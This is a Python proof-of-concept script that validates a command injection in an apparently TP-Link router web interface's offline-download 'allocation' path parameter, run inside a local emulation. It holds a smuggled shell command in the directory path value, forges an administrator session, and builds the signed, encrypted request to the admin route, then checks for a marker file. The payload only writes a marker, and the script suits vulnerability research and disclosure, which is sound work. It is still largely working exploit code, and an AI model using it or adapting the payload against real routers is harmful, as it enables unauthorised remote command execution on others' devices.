#!/usr/bin/env python3
import argparse
import json
import os
import urllib.parse

import requests
import validate_config_backup_rce as base
import validate_offline_download_rce as usb

WORK = base.WORK
ROOT = base.ROOT
BASE = base.BASE
UUID = usb.UUID
DIR_PATH = "G:/a;echo TP_CHANGE_DIR_RCE>tp_change_dir_rce;#"


def prepare():
    config, previous = usb.prepare_usb()
    volume = ROOT + "/tmp/tp-usb"
    directory = volume + DIR_PATH[DIR_PATH.find(":") + 1:]
    os.makedirs(directory, exist_ok=True)
    marker = "tp_change_dir_rce"
    for current, _, files in os.walk(ROOT):
        if marker in files:
            os.unlink(os.path.join(current, marker))
    settings = ROOT + "/etc/config/offline_download"
    settings_previous = open(settings, "rb").read() if os.path.exists(settings) else None
    return config, previous, settings, settings_previous


def cleanup(config, previous, settings, settings_previous):
    usb.cleanup_usb(config, previous)
    if settings_previous is None:
        if os.path.exists(settings):
            os.unlink(settings)
    else:
        with open(settings, "wb") as stream:
            stream.write(settings_previous)
    for current, _, files in os.walk(ROOT):
        if "tp_change_dir_rce" in files:
            os.unlink(os.path.join(current, "tp_change_dir_rce"))
    try:
        os.rmdir(ROOT + "/tmp/tp-usb" + DIR_PATH[DIR_PATH.find(":") + 1:])
    except OSError:
        pass


def direct():
    code = 'local m=require("luci.model.offline_download"); local a,b,c=m.allocation_write({uuid=os.getenv("UUID"),path=os.getenv("DIR_PATH")}); print(tostring(a),tostring(b),tostring(c))'
    print("direct call:", base.lua(code, {"UUID": UUID, "DIR_PATH": DIR_PATH}))


def request():
    auth = requests.post(BASE + "/login?form=auth", data={"operation": "read"}, timeout=15).json()["data"]
    sign_n, sign_e = auth["key"]
    seq = int(auth["seq"])
    sid = "1123456789abcdef0123456789abcdef"
    stok = "11112233445566778899aabbccddeeff"
    key = "1234567890123456"
    iv = "6543210987654321"
    hash_value = base.lua('print(require("luci.service").get_user_hash())')
    base.lua(
        'require("luci.sauth").write(os.getenv("SID"),{addr="127.0.0.1",remote=true,user="admin",token=os.getenv("STOK"),secret=os.getenv("STOK"),hash=os.getenv("HASHV"),aeskey=os.getenv("AESKEY"),aesiv=os.getenv("AESIV"),seqnum=tonumber(os.getenv("SEQ"))})',
        {"SID": sid, "STOK": stok, "HASHV": hash_value, "AESKEY": key, "AESIV": iv, "SEQ": str(seq)},
    )
    form = urllib.parse.urlencode({"operation": "write", "uuid": UUID, "path": DIR_PATH}) + "&"
    encrypted = base.aes(form, key, iv)
    sign = base.rsa("h=" + hash_value + "&s=" + str(seq + len(encrypted)), sign_n, sign_e)
    session = requests.Session()
    session.cookies.set("sysauth", sid)
    response = session.post(
        BASE + "/;stok=" + stok + "/admin/offline_download?form=allocation",
        data=urllib.parse.urlencode({"sign": sign, "data": encrypted}),
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=30,
    )
    print("HTTP status:", response.status_code)
    print("HTTP response:", response.text[:800])
    response_data = json.loads(response.text).get("data")
    if isinstance(response_data, str):
        decrypted = base.lua(
            'print(require("luci.service").aes_dec_data(os.getenv("CRYPT"),{key=os.getenv("AESKEY"),iv=os.getenv("AESIV")}))',
            {"CRYPT": response_data, "AESKEY": key, "AESIV": iv},
        )
        print("decrypted response:", decrypted)


def marker_exists():
    for current, _, files in os.walk(ROOT):
        if "tp_change_dir_rce" in files:
            path = os.path.join(current, "tp_change_dir_rce")
            print("marker:", path, "content:", repr(open(path).read()))
            return True
    return False


def main():
    parser = argparse.ArgumentParser(description="Validate offline-download allocation-path command injection in local emulation")
    parser.add_argument("--direct-only", action="store_true")
    args = parser.parse_args()
    if os.geteuid() != 0:
        raise RuntimeError("run as root on the analysis VM")
    config, previous, settings, settings_previous = prepare()
    try:
        direct() if args.direct_only else request()
        if not marker_exists():
            raise SystemExit("command marker was not created")
        if args.direct_only:
            print("RUNTIME_OBSERVED: allocation path data reached /bin/sh -c in a direct module call")
        else:
            print("VALIDATED: authenticated allocation-path command injection through the real admin/offline_download route")
            print("scope: user-mode Web emulation, simulated USB volume and existing directory, injected test administrator session; not physical-device validation")
    finally:
        cleanup(config, previous, settings, settings_previous)


if __name__ == "__main__":
    main()
